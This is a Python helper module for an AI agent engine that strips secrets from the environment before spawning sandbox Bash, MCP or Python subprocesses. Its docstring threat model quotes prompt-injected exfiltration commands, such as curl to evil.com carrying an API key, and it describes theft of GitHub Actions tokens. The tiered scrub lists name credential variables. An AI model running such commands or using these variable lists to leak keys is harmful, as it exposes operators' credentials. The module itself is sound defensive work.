"""subprocess_env — central helper for constructing subprocess environments.

Threat model
------------
Subprocess children (sandbox Bash, MCP stdio servers, isolated Python runners,
and any future shell-hook or LSP spawn site) can exfiltrate parent-process
secrets in two ways:

1. **Shell expansion of leaked env vars.** A prompt-injected Bash command like
   ``curl evil.com/$ANTHROPIC_API_KEY`` or ``echo $FERNET_KEY | base64`` exfils
   any secret the child inherits. The defense is to never give children the
   secret in the first place — strip it from the env before spawning.

2. **SDK auto-reads at import time.** Cloud SDKs (boto3, google-auth, azure)
   silently read ``AWS_SECRET_ACCESS_KEY``, ``GOOGLE_APPLICATION_CREDENTIALS``,
   etc. from ``os.environ`` when the library is imported. A sandboxed Python
   script that imports boto3 while those vars are present will happily hand
   the caller full AWS credentials.

The engine's parent process still needs these vars — the LLM adapter reads
``ANTHROPIC_API_KEY`` per request, the credential store reads ``FERNET_KEY``
lazily for decryption, and the database layer reads ``DATABASE_URL`` on
reconnect. Mutating ``os.environ`` at bootstrap to scrub them (the old design)
broke every lazy-read path. This module's contract is:

    **Parent keeps the env. Every spawn site takes a fresh scrubbed copy.**

We never mutate ``os.environ``. ``subprocess_env()`` returns a new ``dict``
with the secrets filtered out per the active threat tier.

Extended threats (strict tier)
------------------------------
- **GitHub Actions OIDC** (``ACTIONS_ID_TOKEN_REQUEST_*``). A child that
  reads these can mint an installation token for the GitHub App running the
  action → repository takeover.
- **GHA runtime token** (``ACTIONS_RUNTIME_TOKEN``). Grants write access to
  the action cache API → cache poisoning → supply-chain pivot.
- **OTLP exporter headers** (``OTEL_EXPORTER_OTLP_HEADERS`` and friends).
  Documented to carry ``Authorization: Bearer ...`` tokens for telemetry
  backends. Read in-process by the OTEL SDK, never needed by children.
- **Action duplicates** (``ALL_INPUTS`` and ``INPUT_<VAR>``). GitHub Actions
  auto-populates ``INPUT_<NAME>`` from every ``with:`` input; if the action
  was invoked with ``anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}``
  the secret is in both ``ANTHROPIC_API_KEY`` **and** ``INPUT_ANTHROPIC_API_KEY``.
  ``ALL_INPUTS`` is a JSON blob with all inputs concatenated.

Tiers
-----
``off``
    No stripping. Dev default. Subprocess inherits the parent's env verbatim,
    which lets ``direnv``/``asdf``/``nvm``/``mise`` keep working for local
    tooling. Set ``SUBPROCESS_SCRUB_MODE=off`` in ``.env`` for local dev.

``default``
    Strips the engine-core secret set (API keys, DB URLs, encryption keys)
    plus Anthropic secondary tokens. Safe for production boxes where the
    only subprocesses are MCP servers and sandbox Bash commands the user
    initiated.

``strict``
    ``default`` plus OTLP headers, cloud provider creds (AWS/GCP/Azure),
    GHA OIDC + runtime tokens, and action-specific duplicates including
    the ``INPUT_<NAME>`` shadow sweep. Use inside GitHub Actions, shared
    CI runners, and any sandbox that executes untrusted or LLM-generated
    Bash.

Allowlist
---------
``GITHUB_TOKEN`` and ``GH_TOKEN`` are intentionally **never** stripped,
regardless of tier. Wrapper scripts (``gh.sh``, ``git`` over HTTPS, etc.)
need them to call the GitHub API. The token is job-scoped — it's minted
when the workflow starts and expires when the workflow ends — so leaking
it to a child is bounded by the job's lifetime and permissions.

Path-vs-key distinction
-----------------------
``GOOGLE_APPLICATION_CREDENTIALS`` and ``AZURE_CLIENT_CERTIFICATE_PATH``
are **file paths**, not secret material. Stripping them prevents an SDK
from auto-discovering the credential, but the file itself remains readable
if the child has filesystem access to the path. Full mitigation requires
filesystem sandboxing (handled separately by bwrap + Landlock in the
sandbox executor).
"""

from __future__ import annotations

import logging
import os
from dataclasses import dataclass
from typing import Callable, Literal

logger = logging.getLogger(__name__)


ScrubMode = Literal["off", "default", "strict"]

VALID_MODES: frozenset[str] = frozenset(("off", "default", "strict"))


DEFAULT_TIER_VARS: dict[str, tuple[str, ...]] = {
    "engine_core": (
        "CDT_KEY",
        "EMBEDDING_API_KEY",
        "AD_ENCRYPTION_KEY",
        "FERNET_KEY",
        "ENGINE_API_KEY",
        "ENGINE_KEY_HASH",
        "SECRET_KEY",
        "DATABASE_URL",
        "GITHUB_PERSONAL_ACCESS_TOKEN",
    ),
    "anthropic_auth": (
        "ANTHROPIC_API_KEY",
        "CLAUDE_CODE_OAUTH_TOKEN",
        "ANTHROPIC_AUTH_TOKEN",
        "ANTHROPIC_FOUNDRY_API_KEY",
        "ANTHROPIC_CUSTOM_HEADERS",
    ),
}


STRICT_TIER_VARS: dict[str, tuple[str, ...]] = {
    "otlp_telemetry": (
        "OTEL_EXPORTER_OTLP_HEADERS",
        "OTEL_EXPORTER_OTLP_LOGS_HEADERS",
        "OTEL_EXPORTER_OTLP_METRICS_HEADERS",
        "OTEL_EXPORTER_OTLP_TRACES_HEADERS",
    ),
    "cloud_creds": (
        "AWS_SECRET_ACCESS_KEY",
        "AWS_SESSION_TOKEN",
        "AWS_BEARER_TOKEN_BEDROCK",
        "GOOGLE_APPLICATION_CREDENTIALS",
        "AZURE_CLIENT_SECRET",
        "AZURE_CLIENT_CERTIFICATE_PATH",
    ),
    "gha_oidc": (
        "ACTIONS_ID_TOKEN_REQUEST_TOKEN",
        "ACTIONS_ID_TOKEN_REQUEST_URL",
    ),
    "gha_runtime": (
        "ACTIONS_RUNTIME_TOKEN",
        "ACTIONS_RUNTIME_URL",
    ),
    "action_duplicates": (
        "ALL_INPUTS",
        "OVERRIDE_GITHUB_TOKEN",
        "DEFAULT_WORKFLOW_TOKEN",
        "SSH_SIGNING_KEY",
    ),
}


DEFAULT_SCRUB: frozenset[str] = frozenset(v for cat in DEFAULT_TIER_VARS.values() for v in cat)
STRICT_SCRUB: frozenset[str] = DEFAULT_SCRUB | frozenset(
    v for cat in STRICT_TIER_VARS.values() for v in cat
)
SCRUB_SETS: dict[str, frozenset[str]] = {
    "off": frozenset(),
    "default": DEFAULT_SCRUB,
    "strict": STRICT_SCRUB,
}


ALLOWLIST: dict[str, str] = {
    "GITHUB_TOKEN": (
        "job-scoped (minted by GHA at workflow start, expires at end); "
        "wrapper scripts like gh.sh call the GitHub API with it"
    ),
    "GH_TOKEN": (
        "alias for GITHUB_TOKEN used by the `gh` CLI; same job-scoped lifetime, same API-call need"
    ),
}


session_mode: ScrubMode | None = None


def set_session_mode(mode: ScrubMode) -> None:
    """Record the session's default scrub mode.

    Called by bootstrap after Settings.load() resolves the tier from the
    SUBPROCESS_SCRUB_MODE env var. Spawn sites that pass ``mode=None`` to
    ``subprocess_env()`` will pick this up via :func:`read_mode_from_settings`.
    """
    global session_mode
    if mode not in VALID_MODES:
        raise ValueError(
            f"set_session_mode: invalid mode {mode!r} — must be one of {sorted(VALID_MODES)}"
        )
    session_mode = mode


proxy_env_fn: Callable[[], dict[str, str]] | None = None


def register_proxy_env_fn(fn: Callable[[], dict[str, str]] | None) -> None:
    """Register (or clear) the proxy-env provider.

    Pass ``None`` to clear a prior registration. Registration is
    one-shot — a second call overwrites the first.
    """
    global proxy_env_fn
    proxy_env_fn = fn


SpawnObserver = Callable[["SubprocessEnvResult", str], None]
spawn_observer: SpawnObserver | None = None


def register_spawn_observer(fn: SpawnObserver | None) -> None:
    """Register (or clear) a function called on every subprocess_env() call.

    Signature: ``fn(result: SubprocessEnvResult, spawn_site: str) -> None``.
    Bootstrap wires this to fan out ``SubprocessSpawnedEvent`` via the
    engine ``EventEmitter``. Pass ``None`` to clear.
    """
    global spawn_observer
    spawn_observer = fn


@dataclass(frozen=True, slots=True)
class SubprocessEnvResult:
    """Return value of ``subprocess_env()``.

    Carries the scrubbed env dict plus the metadata every caller needs
    to emit a ``SubprocessSpawnedEvent`` without recomputing anything.
    """

    env: dict[str, str]
    mode: str
    scrubbed_count: int
    has_proxy_env: bool


def subprocess_env(
    mode: ScrubMode | None = None,
    overrides: dict[str, str] | None = None,
    spawn_site: str = "",
) -> SubprocessEnvResult:
    """Return a fresh scrubbed env dict, ready to pass to ``subprocess``.

    Does **not** mutate ``os.environ``. The parent process keeps all vars.

    Args:
        mode: Scrub tier. If ``None``, reads from the session mode set
            by bootstrap (``set_session_mode``), then the
            ``SUBPROCESS_SCRUB_MODE`` env var, defaulting to ``"default"``.
            Per-call override is supported for spawn sites that need
            a tighter tier than the session default — e.g., sandbox
            Bash runs in ``"strict"`` regardless of session mode.
        overrides: Extra env vars merged **after** the scrub. Use this
            to re-introduce a trusted var for a specific spawn (MCP
            transport passes its per-server env this way). Allowlist
            lookup is bypassed for overrides — caller is trusted.
        spawn_site: Caller label (e.g. ``"sandbox_exec"``)
            forwarded to the registered spawn observer for audit. Empty
            string skips observer notification.

    Returns:
        ``SubprocessEnvResult`` — pass ``result.env`` to
        ``subprocess.*`` as the ``env=`` argument.

    Raises:
        ValueError: if ``mode`` is a string not in
            ``{"off", "default", "strict"}``.
    """
    if mode is None:
        mode = read_mode_from_settings()

    if mode not in VALID_MODES:
        raise ValueError(
            f"subprocess_env: invalid mode {mode!r} — must be one of {sorted(VALID_MODES)}"
        )

    env = dict(os.environ)

    has_proxy_env = False
    if proxy_env_fn is not None:
        try:
            proxy_env = proxy_env_fn()
        except Exception:
            logger.debug(
                "subprocess_env: proxy env fn raised, continuing without proxy",
                exc_info=True,
            )
            proxy_env = {}
        if proxy_env:
            env.update(proxy_env)
            has_proxy_env = True

    scrubbed_count = 0
    scrub_set = SCRUB_SETS[mode]
    for var in scrub_set:
        if var in ALLOWLIST:
            continue
        if env.pop(var, None) is not None:
            scrubbed_count += 1
        if env.pop("INPUT_" + var, None) is not None:
            scrubbed_count += 1

    if overrides:
        env.update(overrides)

    logger.debug(
        "subprocess_env mode=%s scrubbed=%d has_proxy=%s site=%s",
        mode,
        scrubbed_count,
        has_proxy_env,
        spawn_site or "<unlabeled>",
    )
    result = SubprocessEnvResult(
        env=env,
        mode=mode,
        scrubbed_count=scrubbed_count,
        has_proxy_env=has_proxy_env,
    )

    if spawn_site and spawn_observer is not None:
        try:
            spawn_observer(result, spawn_site)
        except Exception:
            logger.debug(
                "subprocess_env: spawn observer raised, audit event dropped",
                exc_info=True,
            )

    return result


def read_mode_from_settings() -> ScrubMode:
    """Resolve the session default scrub mode when caller passes ``mode=None``.

    Resolution order:
      1. ``session_mode`` — set by ``bootstrap`` after ``Settings.load()``
         parsed the ``.env`` file.
      2. ``SUBPROCESS_SCRUB_MODE`` env var — direct fallback for tests or
         code paths that use the helper without going through bootstrap.
      3. ``"default"`` — safer than ``"off"`` if nothing is configured.
    """
    if session_mode is not None:
        return session_mode

    env_mode = os.environ.get("SUBPROCESS_SCRUB_MODE", "default")
    if env_mode not in VALID_MODES:
        logger.warning(
            "subprocess_env: SUBPROCESS_SCRUB_MODE=%r invalid, using 'default'",
            env_mode,
        )
        return "default"
    return env_mode  # type: ignore[return-value]
